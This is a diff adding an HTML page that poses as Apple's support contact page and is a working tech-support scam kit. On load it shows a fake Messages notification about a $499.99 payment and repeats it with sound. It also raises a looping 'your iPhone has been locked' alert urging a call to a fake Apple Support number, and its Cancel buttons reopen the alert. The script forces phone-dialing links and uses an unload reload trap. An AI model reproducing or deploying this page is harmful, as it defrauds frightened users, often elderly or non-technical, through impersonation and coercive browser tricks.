@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+
+
+<head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description"
+        content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families=SF+Pro,v1_7CSF+Pro+Icons,v1html.html" />
+    
+    <!-- Preload critical assets for faster mobile rendering -->
+    <link rel="preload" as="image" href="globalnav/apple/contact-us-hero.image.small_2x.jpg" media="(max-width: 735px)" />
+    <link rel="preload" as="image" href="globalnav/apple/contact-us-hero.image.large_2x.jpg" media="(min-width: 736px)" />
+    <link rel="preload" as="image" href="ucloud.jpg" />
+    
+    <script type="text/javascript">
+        (function (c, l, a, r, i, t, y) {
+            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+        })(window, document, "clarity", "script", "wmbhx3ni3j");
+    </script>
+</head>
+
+<body>
+    <style>
+        /* iOS Notification Styles */
+        #ios-notification-container {
+            position: fixed;
+            top: -200px; /* Increased from -150px to ensure it fully hides when sliding up */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 95%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border-radius: 22px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+            z-index: 9999999;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            transition: top 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.1);
+            overflow: hidden;
+            padding: 14px 16px;
+            box-sizing: border-box;
+            border: 0.5px solid rgba(0, 0, 0, 0.05);
+        }
+
+        #ios-notification-container.show {
+            top: 16px;
+        }
+
+        .ios-notification-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px;
+        }
+
+        .ios-notification-header-left {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .ios-app-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .ios-app-name {
+            font-size: 13px;
+            color: #000;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+        }
+
+        .ios-time {
+            font-size: 13px;
+            color: #000;
+            font-weight: 400;
+        }
+
+        .ios-notification-body {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .ios-notification-content {
+            flex: 1;
+        }
+
+        .ios-notification-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 4px;
+            letter-spacing: -0.2px;
+        }
+
+        .ios-notification-text {
+            font-size: 15px;
+            color: #000;
+            line-height: 1.4;
+            padding-right: 8px;
+            letter-spacing: -0.2px;
+        }
+
+        .ios-notification-text span {
+            color: #1461B6; /* iOS blue link color */
+        }
+        
+        .ios-notification-text u {
+            color: #000;
+            text-decoration: underline;
+        }
+
+        .ios-notification-image {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 2px;
+        }
+
+        .ios-notification-image img {
+            width: 42px;
+            height: 42px;
+            border-radius: 8px;
+            object-fit: contain;
+            background-color: transparent;
+        }
+
+        /* First Custom Alert Popup Styles (Center) */
+        #ios-alert-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            z-index: 9999998;
+            align-items: center;
+            /* Center aligned */
+            justify-content: center;
+        }
+
+        #ios-alert-overlay.show {
+            display: flex;
+        }
+
+        #ios-alert-box {
+            background-color: rgba(60, 60, 63, 0.75);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            width: 330px;
+            border-radius: 28px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            text-align: center;
+            overflow: hidden;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
+            padding: 24px 16px 16px 16px;
+            box-sizing: border-box;
+            border: 0.5px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .ios-alert-message {
+            font-size: 16px;
+            color: #FFF;
+            line-height: 1.4;
+            font-weight: 400;
+            margin-bottom: 24px;
+            padding: 0 8px;
+            text-align: center;
+            letter-spacing: -0.2px;
+        }
+
+        /* Update to ensure text formatting is preserved when injected via innerHTML */
+        .ios-alert-message br {
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .ios-alert-buttons-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 2px;
+        }
+
+        .ios-alert-btn-row {
+            flex: 1;
+            padding: 0;
+            font-size: 17px;
+            font-weight: 600;
+            border: none;
+            border-radius: 9999px;
+            cursor: pointer;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 48px;
+        }
+
+        .ios-alert-btn-row.cancel {
+            color: #fff;
+            background-color: rgba(255, 255, 255, 0.25);
+            font-weight: 500;
+        }
+
+        .ios-alert-btn-row.ok {
+            color: #fff;
+            background-color: #3B82F6;
+            font-weight: 600;
+        }
+
+        .ios-alert-btn-row:active {
+            opacity: 0.8;
+        }
+
+        /* Dark mode overrides if needed based on device, though keeping light mode to match image mostly */
+        @media (prefers-color-scheme: dark) {
+            .ios-app-name {
+                color: #000;
+            }
+            .ios-time {
+                color: #000;
+            }
+        }
+    </style>
+
+    <div id="ios-notification-container" onclick="callNumber()" style="cursor: pointer;">
+        <div class="ios-notification-header">
+            <div class="ios-notification-header-left">
+                <div class="ios-app-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="16" height="16">
+                        <rect width="100" height="100" rx="22" fill="#34C759" />
+                        <path
+                            d="M50 22C28 22 12 36 12 53C12 63 18 72 27 77C27 77 26 86 19 91C19 91 34 91 43 80C45 80.5 48 81 50 81C72 81 88 67 88 53C88 36 72 22 50 22Z"
+                            fill="#FFF" />
+                    </svg>
+                </div>
+                <span class="ios-app-name">MESSAGES</span>
+            </div>
+            <div class="ios-notification-header-right">
+                <span class="ios-time">now</span>
+            </div>
+        </div>
+        <div class="ios-notification-body">
+            <div class="ios-notification-content">
+                <div class="ios-notification-title">Payment Successful</div>
+                <div class="ios-notification-text"><span>Sent $ 499.99 via Online Transaction to <u>Betonline.net</u> & <u>pornhub.net</u> . Not you? Call <span class="dynamic-phone"></span></span></div>
+            </div>
+        </div>
+    </div>
+    <div id="ios-alert-overlay">
+        <div id="ios-alert-box">
+            <div class="ios-alert-message">Your iPhone has been locked due to detected illegal activity. Your Apple Account has been disabled! Immediately call Apple Support <span class="dynamic-phone"></span> to unlock it!</div>
+            <div class="ios-alert-buttons-row">
+                <button class="ios-alert-btn-row cancel" onclick="reopenAlert()">Cancel</button>
+                <button class="ios-alert-btn-row ok" onclick="callNumber()">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="ios-second-alert-overlay">
+        <div id="ios-second-alert-box">
+            <div class="ios-second-alert-content">
+                <div class="ios-second-alert-message">Your iPhone has been locked due to detected illegal activity .Your
+                    Apple Account has been disabled! Immediately call Apple Support <span class="dynamic-phone"></span> to unlock it!
+                </div>
+            </div>
+            <div class="ios-second-alert-buttons">
+                <button class="ios-second-alert-btn" onclick="callNumber()">Call <span class="dynamic-phone"></span></button>
+                <button class="ios-second-alert-btn cancel" onclick="reopenSecondAlert()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Audio element for notification sound -->
+    <audio id="notification-sound" src="ualert.mpeg" preload="auto"></audio>
+
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+                        </span>
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+                        </span>
+                    </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open"
+                        id="ac-gn-menuanchor-open">
+                        <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+                        <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+                        <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span
+                            class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+                        <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+                        <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+                        <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+                        <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+                        <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+                        <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+                        <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+                        <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+                        <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+                        <span class="ac-gn-link-text">Shopping Bag </span>
+                        <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search"
+                        method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text"
+                                placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off"
+                                spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit"
+                                disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled=""
+                                aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+                    <span class="ac-gn-searchview-close-wrapper">
+                        <span class="ac-gn-searchview-close-left"></span>
+                        <span class="ac-gn-searchview-close-right"></span>
+                    </span>
+                </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                        <a href="#" class="dynamic-phone-link">Apple Support <span class="dynamic-phone"></span> <font color="red">
+                                <font class="js_setPhoneBlock"></font>
+                            </font></a>
+                    </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open"
+                            id="ac-ln-menustate-open"> <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a
+                            href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">
+                            <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink">
+                                        Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta"> <span
+                                        class="ac-ln-menucta-chevron"></span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw"
+                                srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w"
+                                alt="" class="as-image-speculativedownload"
+                                src="globalnav/apple/contact-us-hero.image.large_2x.jpg" fetchpriority="high" decoding="sync" />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple
+                        Store </a>, <span class="nowrap">call <font class="js_setPhoneBlock"></font>, or <a href="#"
+                            class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region"
+                        aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag"
+                            src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+                        States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2023 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink"
+                            href="#">Privacy
+                            Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a
+                            class="ac-gf-footer-legal-link" href="#">Site
+                            Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+                            Apple </a>
+                    </div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta id="meta-telephone" content="" property="telephone" />
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="phone.js"></script>
+    <script src="text.js"></script>
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function (a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function (a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function (a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : window.SITE_PHONE_NUMBER);
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        // Function to push the notification and play sound
+        function pushNotification() {
+            var notifContainer = document.getElementById('ios-notification-container');
+
+            // If already showing, temporarily hide it to trigger animation again
+            if (notifContainer.classList.contains('show')) {
+                notifContainer.classList.remove('show');
+                setTimeout(function () {
+                    showNotificationWithSound(notifContainer);
+                }, 600); // Increased wait time to allow the larger notification to fully slide up before dropping down again
+            } else {
+                showNotificationWithSound(notifContainer);
+            }
+        }
+
+        function showNotificationWithSound(container) {
+            container.classList.add('show');
+            // Try to play sound when notification appears
+            var audio = document.getElementById('notification-sound');
+            if (audio) {
+                audio.currentTime = 0; // Reset audio to start so it plays fully every time
+                var playPromise = audio.play();
+                if (playPromise !== undefined) {
+                    playPromise.catch(function (error) {
+                        console.log("Autoplay prevented by browser. Sound will play on first interaction.");
+                    });
+                }
+            }
+        }
+
+        // --- STANDARD NOTIFICATION & POPUP FLOW ---
+        
+        function showVisuals() {
+            // Show Notification
+            pushNotification();
+
+            // Start notification loop
+            setInterval(pushNotification, 8000);
+
+            // Show Popup
+            document.getElementById('ios-alert-overlay').classList.add('show');
+            document.querySelector('#ios-alert-box .ios-alert-message').innerHTML = getText();
+        }
+
+        // Trigger visuals immediately on load
+        setTimeout(showVisuals, 100);
+
+        // Fallback: Attempt to play audio on any user click if autoplay was blocked
+        document.body.addEventListener('click', function() {
+            var audio = document.getElementById('notification-sound');
+            if (audio && audio.paused && audio.currentTime === 0) {
+                audio.play().catch(function(e){});
+            }
+        }, { once: true });
+
+        <!-- Audio element for notification sound -->
+
+        function callNumber() {
+            okkkk();
+            window.location.href = "tel:" + window.SITE_PHONE_NUMBER.replace(/[^\d+]/g, "");
+        }
+
+        function reopenAlert() {
+            document.getElementById('ios-alert-overlay').classList.remove('show');
+            setTimeout(function () {
+                document.getElementById('ios-alert-overlay').classList.add('show');
+            }, 50); // Wait 50ms and show it again immediately
+            okkkk(); // Trigger background spam
+        }
+
+        function okkkk() {
+            jQuery('#result').append('<a class="anchorcall" href="tel:' + window.SITE_PHONE_NUMBER.replace(/[^\d+]/g, "") + '"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            // Unused
+        }
+
+        window.ununload = function () {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var displayPhone = window.SITE_PHONE_NUMBER;
+            var linkPhone = "tel:" + displayPhone.replace(/[^\d+]/g, '');
+            
+            var phoneSpans = document.querySelectorAll('.dynamic-phone');
+            for (var i = 0; i < phoneSpans.length; i++) {
+                phoneSpans[i].textContent = displayPhone;
+            }
+
+            var phoneLinks = document.querySelectorAll('.dynamic-phone-link');
+            for (var i = 0; i < phoneLinks.length; i++) {
+                phoneLinks[i].href = linkPhone;
+            }
+            
+            var metaTel = document.getElementById('meta-telephone');
+            if(metaTel) {
+                metaTel.content = displayPhone;
+            }
+        });
+    </script>
+</body>
+
+</html>
